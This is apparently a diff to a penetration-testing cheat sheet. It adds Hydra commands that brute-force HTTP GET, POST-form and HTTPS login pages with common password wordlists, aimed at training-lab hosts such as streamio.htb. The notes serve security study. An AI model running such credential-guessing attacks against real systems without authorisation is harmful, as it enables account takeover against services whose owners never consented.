@@ -1,20 +1,26 @@
 
-## GET Request
+###### GET Request
 
 ```
 hydra -l <user> -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt <target_ip> -s <target_port> http-get
 ```
-
-## POST Request
+###### POST Request
 
 ```
 hydra -l <user> -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt <target_ip> -s <target_port> http-post-form 
 ```
 
+HTTP
+
 ```
 hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt target.ine.local http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username or password"
 ```
 
+HTTPS
+
+```
+hydra -L users.txt -P passwords.txt streamio.htb https-post-form  "/login.php:username=^USER^&password=^PASS^:F=Login Failed"
+```
 ## Secure Scan RDP
 
 ```
